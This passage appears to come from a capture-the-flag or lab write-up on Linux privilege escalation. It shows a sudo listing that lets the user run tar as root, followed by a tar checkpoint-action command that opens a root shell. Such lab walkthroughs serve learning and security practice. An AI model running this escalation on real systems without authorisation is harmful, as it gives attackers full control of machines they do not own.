# root.txt
## Privilege Escalation

Next step was to check sudo permissions:

sudo -l

Output showed:

(root) /bin/tar

This means I can run `tar` as root without a password.



## Exploiting tar

I knew that `tar` can be abused to execute commands, so I used:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

This gave me a root shell.

